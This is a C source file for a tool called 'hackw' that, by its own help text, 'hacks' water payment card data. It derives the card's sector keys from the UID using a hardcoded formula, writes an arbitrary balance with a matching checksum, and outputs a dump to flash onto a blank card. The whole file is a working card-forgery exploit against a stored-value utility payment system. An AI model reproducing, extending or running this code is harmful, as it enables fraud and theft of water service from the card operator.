#include "hackw.h"

const AREA blank={{0},{0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
void printHelp(){
    printf("\nUsage: hackw \033[32m[OPTION]... [PRICE] \033[0m{[EXTRAOPTIONS] [DATA]}... \n\033[31mHack the water card data.\033[0m\nLater you need to flash the '.bin' or '.dump' file to a new card.\n\n");
    printf("Mandatory arguments to long options are mandatory for short options too\n");
    printf("\nOptions:\n");
    printf("  -b, --bin\t\toutput the flash file in '.bin'\n");
    printf("  -d, --dump\033[33m(Default)\033[0m\toutput the flash file in '.dump'\n");
    printf("  -h, --half-deduction\twhen you pay a unit but haven't\n");
    printf("\t\t\tused it all up\n");
    printf("\nExtraOptions:\n");
    printf("  -t, --card-type\tset the type of the card. such as\n");
    printf("\t\t\tUID \n\t\t\tCUID\033[33m(Default)\033[0m\n");
    printf("  -o, --owner-data\tuse advanced mode,write the user\n");
    printf("\t\t\tdata into the binary file. \033[32mor the\n");
    printf("\t\t\tprogram will use random UIDs to p-\n");
    printf("\t\t\trotect our door from getting hacked.\033[0m\n");
    printf("      --help\t\tprint the prompts\n");
}
int allHex(const char *str){
    if (strlen(str)!=8) return 0;
    for (int i = 0; str[i]; ++i) {
        if (!isalnum(str[i])||(tolower(str[i])>'f'&& tolower(str[i])<='z'))
            return 0;
    }
    return 1;
}
int allNum(const char *str){
    int counter = 0;
    while (*str) {
        if (!isdigit(*str)){
            if(*str =='.'&&counter==0) counter = 1;
            else return 0;}
        str++;}
    return 1;
}
/** return
 * 0: not legal input;
 * 1: read succeed, but not extra_options
 * 2: read succeed,and is -t
 * 3: read succeed,and is -o
 * 4: read succeed, and is --help
 */
int countNum(const char *str,int *num){
    if (str[0] == '-' && str[1]){
        if(strcmp(str,"--bin") == 0 && *num%2==0) *num += 1;
        else if ((strcmp(str,"--dump") == 0||strcmp(str,"-dump") == 0) && (*num%4)/2==0) *num +=2;
        else if ((strcmp(str,"--half-deduction") ==0 ||strcmp(str,"-half-deduction") ==0)&& *num/4==0) *num +=4;
        else if (strcmp(str,"-t")==0||strcmp(str,"--card-type")==0||strcmp(str,"-card-type")==0) return 2;
        else if (strcmp(str,"-o")==0||strcmp(str,"--owner-data")==0||strcmp(str,"-owner-data")==0) return 3;
        else if (strcmp(str,"--help") ==0||strcmp(str,"-help") ==0) return 4;
        else for (int i = 1; str[i]; i++) {
                int tmep = 0;
                if (str[i]=='b'&& *num%2==0) {*num +=1;tmep = 1;}
                if (str[i]=='d'&& (*num%4)/2==0) {*num +=2;tmep = 1;}
                if (str[i]=='h'&& *num/4==0) {*num +=4;tmep = 1;}
                if (!tmep) return 0;
            }
    } else return 0;
    return 1;
}
int hexToB(const char *hexString, unsigned char *byteArray) {
    if(strlen(hexString)%2==0){
        for (int i = 0; hexString[2*i]; i++) {
            sscanf(hexString + (2 * i), "%2hhx", &byteArray[i]);
        }
        return 1;
    }
    return 0;
}
/**
 *
 * @param UID
 * @param cardType tye 0:UID,1:CUID,FUID,UFUID
 * @return the result
 */
AREA calculate0(const unsigned char *UID,const int cardType){
    unsigned char bcc_check = UID[0]^UID[1]^UID[2]^UID[3];
    AREA temp;
    memcpy(&temp, &blank, sizeof(AREA));
    for (int i = 0; i < 4; ++i) {
        temp.blocks[0].data[i]=UID[i];
    }
    temp.blocks[0].data[4]=bcc_check;
    if(cardType==1){
        temp.blocks[0].data[5]=0x08;
        temp.blocks[0].data[6]=0x04;
    } else if(cardType==0){}
    return temp;
}
AREA calculate8(const unsigned char *UID,int num,int ifHalf,unsigned char times) {
    const unsigned char c = ifHalf*5;
    const unsigned char b = num/256;
    const unsigned char a = num%256;
    const unsigned char d = a+b+c+times;
    const unsigned char e = UID[0]+UID[1]+UID[2]+0x01;
    const unsigned char A = UID[0]-0x3d;
    const unsigned char B = UID[1]-0x0f;
    const unsigned char C = UID[2]|0x39;
    const unsigned char D = (UID[3]-0xdb)^0x29;
    const unsigned char E = (UID[0]+0x11)^0x65;
    const unsigned char F = (UID[3]+0x30)&0x77;
    const unsigned char keys[6]={A,B,C,D,E,F};
    BLOCK water_data={0},check={0},key={0};
    const AREA ret_area;
    check.data[0]=UID[0];
    check.data[1]=UID[1];
    check.data[2]=UID[2];
    check.data[3]=0x01;
    check.data[15]=e;
    water_data.data[0]=a;
    water_data.data[1]=b;
    water_data.data[5]=c;
    water_data.data[12]=times;
    water_data.data[15]=d;
    key.data[6]=0xff;
    key.data[7]=0x07;
    key.data[8]=0x80;
    key.data[9]=0x69;
    for (int i = 0; i < 6; ++i) {key.data[i] = keys[i];key.data[i+10] = keys[i];}
    memcpy(&(ret_area.blocks[0]), &check, sizeof(BLOCK));
    memcpy(&(ret_area.blocks[1]), &water_data, sizeof(BLOCK));
    memcpy(&(ret_area.blocks[2]), &water_data, sizeof(BLOCK));
    memcpy(&(ret_area.blocks[3]), &key, sizeof(BLOCK));
    return ret_area;
};